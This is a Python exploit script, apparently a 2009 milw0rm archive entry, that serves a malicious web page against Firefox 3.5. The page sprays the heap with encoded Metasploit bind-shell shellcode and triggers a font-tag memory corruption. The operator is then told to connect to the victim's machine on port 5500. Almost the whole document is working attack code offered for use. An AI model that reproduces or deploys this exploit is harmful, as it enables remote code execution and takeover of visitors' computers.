<html><head><title>Mozilla Firefox 3.5 (Font tags) Remote Heap Spray Exploit</title></head><pre>#!/usr/bin/env python
#######################################################
#
# FireFox 3.5 Heap Spray Exploit
# Originally discovered by: Simon Berry-Bryne
# Pythonized by: David Kennedy (ReL1K) @ SecureState
#
#######################################################
from BaseHTTPServer import HTTPServer 
from BaseHTTPServer import BaseHTTPRequestHandler 
import sys 

class myRequestHandler(BaseHTTPRequestHandler):

  def do_GET(self):
    self.printCustomHTTPResponse(200)
    if self.path == &quot;/&quot;:
        target=self.client_address[0]
        self.wfile.write(&quot;&quot;&quot;
&lt;html&gt;
&lt;head&gt;
&lt;title&gt;Firefox 3.5 Vulnerability&lt;/title&gt;
Firefox 3.5 Heap Spray Exploit
&lt;/br&gt;
Discovered by: SBerry aka Simon Berry-Byrne
Pythonized: David Kennedy (ReL1K) at SecureState
Bind Shell Port: 5500
Encoding: Shikata_Ga_Nai
&lt;/br&gt;
&lt;div id=&quot;content&quot;&gt;
&lt;p&gt;
&lt;FONT&gt;                             
&lt;/FONT&gt;
&lt;/p&gt;
&lt;p&gt;
&lt;FONT&gt;Ihazacrashihazacrash&lt;/FONT&gt;&lt;/p&gt;
&lt;p&gt;
&lt;FONT&gt;Ohnoesihazacrashhazcrash&lt;/FONT&gt;
&lt;/p&gt;
&lt;p&gt;
&lt;FONT&gt;Aaaaahhhhh  &lt;/FONT&gt;
&lt;/p&gt;
&lt;/div&gt;
&lt;script language=JavaScript&gt;

// windows/shell_bind_tcp - 317 bytes http://www.metasploit.com LPORT=5500 encoding=shikata_ga_nai
var shellcode= unescape(&quot;%u6afc%u4deb%uf9e8%uffff%u60ff%u6c8b%u2424%u458b%u8b3c%u057c%u0178%u8bef&quot; +
			&quot;%u184f%u5f8b%u0120%u49eb%u348b%u018b%u31ee%u99c0%u84ac%u74c0%uc107%u0dca&quot; +
			&quot;%uc201%uf4eb%u543b%u2824%ue575%u5f8b%u0124%u66eb%u0c8b%u8b4b%u1c5f%ueb01&quot; +
			&quot;%u2c03%u898b%u246c%u611c%u31c3%u64db%u438b%u8b30%u0c40%u708b%uad1c%u408b&quot; +
			&quot;%u5e08%u8e68%u0e4e%u50ec%ud6ff%u5366%u6866%u3233%u7768%u3273%u545f%ud0ff&quot; +
			&quot;%ucb68%ufced%u503b%ud6ff%u895f%u66e5%ued81%u0208%u6a55%uff02%u68d0%u09d9&quot; +
			&quot;%uadf5%uff57%u53d6%u5353%u5353%u5343%u5343%ud0ff%u6866%u7c15%u5366%ue189&quot; +
			&quot;%u6895%u1aa4%uc770%uff57%u6ad6%u5110%uff55%u68d0%uada4%ue92e%uff57%u53d6&quot; +
			&quot;%uff55%u68d0%u49e5%u4986%uff57%u50d6%u5454%uff55%u93d0%ue768%uc679%u5779&quot; +
			&quot;%ud6ff%uff55%u66d0%u646a%u6866%u6d63%ue589%u506a%u2959%u89cc%u6ae7%u8944&quot; +
			&quot;%u31e2%uf3c0%ufeaa%u2d42%u42fe%u932c%u7a8d%uab38%uabab%u7268%ub3fe%uff16&quot; +
			&quot;%u4475%ud6ff%u575b%u5152%u5151%u016a%u5151%u5155%ud0ff%uad68%u05d9%u53ce&quot; +
			&quot;%ud6ff%uff6a%u37ff%ud0ff%u578b%u83fc%u64c4%ud6ff%uff52%u68d0%uceef%u60e0&quot; +
			&quot;%uff53%uffd6%u41d0&quot;);
oneblock = unescape(&quot;%u0c0c%u0c0c&quot;);
var fullblock = oneblock;
while (fullblock.length&lt;0x60000)  
{
    fullblock += fullblock;
}
sprayContainer = new Array();
for (i=0; i&lt;600; i++)  
{
    sprayContainer[i] = fullblock + shellcode;
}
var searchArray = new Array()
 
function escapeData(data)
{
 var i;
 var c;
 var escData='';
 for(i=0;i&lt;data.length;i++)
  {
   c=data.charAt(i);
   if(c=='&amp;' || c=='?' || c=='=' || c=='%' || c==' ') c = escape(c);
   escData+=c;
  }
 return escData;
}
function DataTranslator(){
    searchArray = new Array();
    searchArray[0] = new Array();
    searchArray[0][&quot;str&quot;] = &quot;blah&quot;;
    var newElement = document.getElementById(&quot;content&quot;)
    if (document.getElementsByTagName) {
        var i=0;
        pTags = newElement.getElementsByTagName(&quot;p&quot;)
        if (pTags.length &gt; 0)  
        while (i&lt;pTags.length)
        {
            oTags = pTags[i].getElementsByTagName(&quot;font&quot;)
            searchArray[i+1] = new Array()
            if (oTags[0])  
            {
                searchArray[i+1][&quot;str&quot;] = oTags[0].innerHTML;
            }
            i++
        }
    }
}
 
function GenerateHTML()
{
    var html = &quot;&quot;;
    for (i=1;i&lt;searchArray.length;i++)
    {
        html += escapeData(searchArray[i][&quot;str&quot;])
    }    
}
DataTranslator();
GenerateHTML()
&lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;&quot;&quot;&quot;)
        print (&quot;\n\n[-] Exploit sent... [-]\n[-] Wait about 30 seconds and attempt to connect.[-]\n[-] Connect to IP Address: %s and port 5500 [-]&quot; % (target))

  def printCustomHTTPResponse(self, respcode):
    self.send_response(respcode)
    self.send_header(&quot;Content-type&quot;, &quot;text/html&quot;)
    self.send_header(&quot;Server&quot;, &quot;myRequestHandler&quot;)
    self.end_headers()

httpd = HTTPServer(('', 80), myRequestHandler)

print (&quot;&quot;&quot;
#######################################################
#
# FireFox 3.5 Heap Spray
# Originally discovered by: Simon Berry-Bryne
# Pythonized: David Kennedy (ReL1K) @ SecureState
#
#######################################################
&quot;&quot;&quot;)
print (&quot;Listening on port 80.&quot;)
print (&quot;Have someone connect to you.&quot;)
print (&quot;\nType &lt;control&gt;-c to exit..&quot;)
try:
     httpd.handle_request()
     httpd.serve_forever() 
except KeyboardInterrupt:
       print (&quot;\n\nExiting exploit...\n\n&quot;)
       sys.exit(1)

# milw0rm.com [2009-07-17]</pre></html>